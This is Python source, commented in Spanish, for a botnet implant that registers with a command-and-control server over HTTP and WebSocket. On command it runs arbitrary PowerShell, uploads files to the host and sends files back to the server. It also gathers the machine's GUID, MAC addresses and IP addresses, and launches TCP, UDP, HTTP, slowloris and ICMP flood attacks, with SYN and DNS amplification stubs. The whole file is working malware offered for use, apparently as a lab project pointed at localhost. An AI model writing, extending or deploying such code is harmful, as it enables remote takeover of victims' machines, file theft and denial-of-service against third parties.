import asyncio
import json
import subprocess
import signal
import sys
import os
import base64
import socket
import random
import threading
import time
from websockets import connect
from websockets.exceptions import ConnectionClosedError
from typing import List, Dict, Tuple, Optional
import requests

class Impl:
    def __init__(self, c2_ws_url: str, group: str = "grupo1"):
        self.c2_ws_url = c2_ws_url
        self.group = group
        self.current_dir = os.getcwd()
        self.upload_buffer = []
        self.upload_destination = None
        self.running = True
        self.active_attack = False
        self.attack_thread = None
        
        # Configurar manejador de señales
        signal.signal(signal.SIGINT, self._def_handler)
    
    async def run(self) -> None:
        """Método principal para iniciar el implante"""
        await self.register()
        while self.running:
            try:
                await self._connect_to_c2()
            except Exception as e:
                print(f"Error de conexión: {e}, reintentando en 5 segundos...")
                await asyncio.sleep(5)
    
    async def _connect_to_c2(self) -> None:
        """Establece conexión WebSocket con el C2"""
        async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
            print(f"[+] Conectado a C2 en {self.c2_ws_url}")
            while self.running:
                await self._handle_commands(ws)
    
    async def _handle_commands(self, ws) -> None:
        """Maneja los comandos recibidos del C2"""
        try:
            cmd = await ws.recv()
            data = json.loads(cmd.replace("'", '"'))
            print(f"[+] Comando recibido: {data}")
            
            if 'cmd' in data:
                await self._execute_command(ws, data['cmd'])
            elif 'chunk' in data:
                await self._handle_file_upload(ws, data)
            elif 'list_files' in data:
                await self._list_directory(ws, data.get('path', self.current_dir))
            elif 'get_files' in data:
                await self._send_file(ws, data['get_files'])
            elif 'attack' in data:
                await self._handle_attack_command(ws, data)
            elif 'stop_attack' in data:
                await self._stop_attack(ws)
        
        except ConnectionClosedError:
            print("[-] Conexión cerrada por el servidor")
            raise
        except Exception as e:
            print(f"[-] Error procesando comando: {e}")
            await ws.send(json.dumps({"error": str(e)}))
    
    async def _execute_command(self, ws, command: str) -> None:
        """Ejecuta un comando del sistema y devuelve el resultado"""
        command = command.strip()
        
        if command.startswith("cd "):
            await self._change_directory(ws, command[3:].strip())
        else:
            out, err, cwd = self._execute_shell_command(command)
            await ws.send(json.dumps({
                "result": out if out else err,
                "cwd": cwd
            }))
    
    async def _change_directory(self, ws, path: str) -> None:
        """Maneja el comando de cambio de directorio"""
        path = path.replace('"', '')
        if path == "..":
            self.current_dir = os.path.dirname(self.current_dir)
        else:
            new_path = os.path.abspath(os.path.join(self.current_dir, path))
            if os.path.isdir(new_path):
                self.current_dir = new_path
            else:
                await ws.send(json.dumps({
                    "error": f"El directorio '{path}' no existe.",
                    "cwd": self.current_dir
                }))
                return
        
        await ws.send(json.dumps({
            "result": "",
            "error": "",
            "cwd": self.current_dir
        }))
    
    def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
        """Ejecuta un comando en el shell y retorna stdout, stderr y el directorio actual"""
        escaped_cmd = command.replace('"', '"')
        result = subprocess.run(
            ['powershell.exe', '-Command', f'Set-Location "{self.current_dir}"; {escaped_cmd}'],
            capture_output=True, 
            text=True
        )
        return result.stdout, result.stderr, self.current_dir
    
    async def _handle_file_upload(self, ws, data: Dict) -> None:
        """Maneja la subida de archivos por chunks"""
        try:
            part = base64.b64decode(data['chunk']['data'])
            is_last = data['chunk'].get('last', False)
            
            self.upload_buffer.append(part)
            
            if self.upload_destination is None:
                self.upload_destination = data['destination']
            
            if is_last:
                with open(self.upload_destination, "wb") as f:
                    for chunk in self.upload_buffer:
                        f.write(chunk)
                
                # Limpieza del buffer
                self.upload_buffer.clear()
                self.upload_destination = None
                
                await ws.send(json.dumps({
                    "status": "success",
                    "message": f"Archivo recibido en {self.upload_destination}"
                }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "status": "error",
                "message": str(e)
            }))
    
    async def _list_directory(self, ws, path: str) -> None:
        """Lista los archivos en un directorio"""
        if not os.path.exists(path):
            await ws.send(json.dumps({
                "error": f"Ruta no encontrada: {path}"
            }))
            return
        
        items = []
        try:
            for name in os.listdir(path):
                full_path = os.path.join(path, name)
                item_type = "directory" if os.path.isdir(full_path) else "file"
                items.append({
                    "name": name,
                    "type": item_type,
                    "size": os.path.getsize(full_path) if item_type == "file" else 0
                })
            
            await ws.send(json.dumps({
                "items": items,
                "path": path,
                "status": "success"
            }))
        
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _send_file(self, ws, file_path: str) -> None:
        """Envía un archivo al C2"""
        if not os.path.isfile(file_path):
            await ws.send(json.dumps({
                "error": f"Archivo no encontrado: {file_path}",
                "status": "error"
            }))
            return
        
        try:
            with open(file_path, "rb") as f:
                content = base64.b64encode(f.read()).decode("utf-8")
            
            await ws.send(json.dumps({
                "filename": os.path.basename(file_path),
                "path": file_path,
                "content": content,
                "status": "success"
            }))
        except Exception as e:
            await ws.send(json.dumps({
                "error": str(e),
                "status": "error"
            }))
    
    async def _handle_attack_command(self, ws, data: Dict) -> None:
        """Maneja los comandos de ataque"""
        attack_type = data['attack']['type']
        target = data['attack']['target']
        duration = data['attack'].get('duration', 60)
        
        # Detener cualquier ataque previo
        if self.active_attack:
            await self._stop_attack(ws)
        
        # Iniciar nuevo ataque
        self.active_attack = True
        self.attack_thread = threading.Thread(
            target=self._execute_attack,
            args=(str(attack_type), str(target), int(duration), ws),
            daemon=True
        )
        self.attack_thread.start()
        
        await ws.send(json.dumps({
            "status": "attack_started",
            "attack_type": attack_type,
            "target": target,
            "duration": duration
        }))
    
    def _execute_attack(self, attack_type: str, target: str, duration: int, ws) -> None:

        """Ejecuta el ataque en un hilo separado"""
        end_time = time.time() + duration
        
        try:
            if attack_type == "tcp_flood":
                self._tcp_flood_attack(target, end_time)
            elif attack_type == "udp_flood":
                self._udp_flood_attack(target, end_time)
            elif attack_type == "http_flood":
                self._http_flood_attack(target, end_time)
            elif attack_type == "slowloris":
                self._slowloris_attack(target, end_time)
            elif attack_type == "syn_flood":
                self._syn_flood_attack(target, end_time)
            elif attack_type == "icmp_flood":
                self._icmp_flood_attack(target, end_time)
            elif attack_type == "dns_amplification":
                self._dns_amplification_attack(target, end_time)
            else:
                print(f"[!] Tipo de ataque no reconocido: {attack_type}")
        except Exception as e:
            print(f"[!] Error en el ataque: {e}")
        finally:
            self.active_attack = False
    
    def _tcp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque de inundación TCP"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.send(random._urandom(1024))
                s.close()
            except:
                pass
    
    def _udp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque de inundación UDP"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _http_flood_attack(self, target: str, end_time: float) -> None:
        print(target)
        """Ataque de inundación HTTP"""
        import urllib.request
        # 1. Verificar formato del target
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target  # Asumir HTTP si no se especifica
        
        # 2. Configurar timeout para no bloquear el ataque
        socket.setdefaulttimeout(5)  # 5 segundos
        
        # 3. Headers básicos para evitar bloqueos
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Connection': 'close'  # No mantener conexiones vivas
        }
        
        # 4. Preparar la solicitud
        request = urllib.request.Request(
            url=target,
            headers=headers,
            method='GET'
        )
        
        print(f"[*] Iniciando HTTP Flood a {target}")
        
        # 5. Bucle principal de ataque
        while time.time() < end_time and self.active_attack:
            try:
                # 6. Enviar petición y leer algo de respuesta
                with urllib.request.urlopen(request) as response:
                    response.read(64)  # Leer mínimo para consumir recursos
                
                # 7. Pequeña pausa para evitar saturación local
                time.sleep(0.01)
                
            except urllib.error.URLError as e:
                print(f"[!] Error de URL: {e.reason}")
                break
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                time.sleep(1)  # Esperar antes de reintentar
        
        print("[*] Ataque HTTP Flood finalizado")
    
    def _slowloris_attack(self, target: str, end_time: float) -> None:
        """Ataque Slowloris (mantiene conexiones HTTP abiertas)"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        sockets = []
        
        try:
            while time.time() < end_time and self.active_attack:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                    sockets.append(s)
                except:
                    self._close_sockets(sockets)
                    sockets = []
                
                # Mantener conexiones vivas
                for s in sockets:
                    try:
                        s.send("X-a: b\r\n".encode())
                    except:
                        sockets.remove(s)
                
                time.sleep(15)
        finally:
            self._close_sockets(sockets)
    
    def _syn_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque SYN flood"""
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
        
        while time.time() < end_time and self.active_attack:
            try:
                # Crear socket raw requiere permisos de administrador
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Paquete SYN simplificado (en realidad necesitarías construir los headers correctamente)
                packet = b'\x00' * 64  # Placeholder
                s.sendto(packet, (target_ip, target_port))
                s.close()
            except:
                pass
    
    def _icmp_flood_attack(self, target: str, end_time: float) -> None:
        """Ataque ICMP (Ping) flood"""
        import os
        
        while time.time() < end_time and self.active_attack:
            try:
                if os.name == 'nt':
                    os.system(f"ping -n 1 -l 65500 {target} > nul")
                else:
                    os.system(f"ping -c 1 -s 65500 {target} > /dev/null")
            except:
                pass
    
    def _dns_amplification_attack(self, target: str, end_time: float) -> None:
        """Ataque de amplificación DNS"""
        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]  # Servidores DNS públicos
        target_ip = target.split(":")[0]
        
        while time.time() < end_time and self.active_attack:
            try:
                for dns_server in dns_servers:
                    # Consulta DNS simplificada (en realidad necesitarías construir una consulta válida)
                    query = b'\x00' * 64  # Placeholder
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(query, (dns_server, 53))
                    s.close()
            except:
                pass
    
    def _close_sockets(self, sockets: list) -> None:
        """Cierra todos los sockets en la lista"""
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    async def _stop_attack(self, ws) -> None:
        """Detiene cualquier ataque en curso"""
        self.active_attack = False
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1)
        
        await ws.send(json.dumps({
            "status": "attack_stopped",
            "message": "Ataque detenido correctamente"
        }))
    
    async def register(self) -> None:
        """Registra el implante con el servidor C2"""
        model = {
            'impl_mac': self._get_macs(),
            'group': self.group,
            'public_ip': self._get_public_ip(),
            'local_ip': self._get_local_ips(),
            'operating_system': self._get_operating_system(),
            'impl_id': self.impl_id
        }
 
        print(f"[+] Implante registrado: {model}")
        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)

    @property
    def impl_id(self) -> str:
        """Obtiene un ID único para el implante"""
        output, _, _ = self._execute_shell_command(
            "(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid).MachineGuid"
        )
        return str(output).replace('\\n', '').strip()
    
    def _get_macs(self) -> List[str]:
        """Obtiene las direcciones MAC de las interfaces de red"""
        macs_output, err, _ = self._execute_shell_command(
            "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress"
        )
        return [mac.replace("\n", "").replace("\r", "") for mac in macs_output.splitlines()] if macs_output else ['undefined']
    
    def _get_local_ips(self) -> List[str]:
        """Obtiene las direcciones IP locales"""
        ips_output, err, _ = self._execute_shell_command(
            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress"
        )
        return [ip.replace("\n", "").replace("\r", "") for ip in ips_output.splitlines()] if ips_output else ['undefined']
    
    def _get_public_ip(self) -> str:
        """Obtiene la dirección IP pública"""
        ip_output, err, _ = self._execute_shell_command('Invoke-RestMethod -Uri "https://api.ipify.org"')
        return ip_output.strip() if ip_output else "undefined"
    
    def _get_operating_system(self) -> str:
        """Obtiene información del sistema operativo"""
        sysop, err, _ = self._execute_shell_command('(Get-CimInstance Win32_OperatingSystem).Caption')
        return sysop.strip() if sysop else "undefined"
    
    def _def_handler(self, sig, frame) -> None:
        """Manejador de señales para salida limpia"""
        print("\n\n[!] Saliendo..\n")
        self.running = False
        self.active_attack = False
        sys.exit(1)

if __name__ == "__main__":
    # Configuración del implante
    C2_WS_URL = "ws://localhost:4000/api/rcv"
    GROUP_NAME = "grupo1"
    
    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
    asyncio.run(impl.run())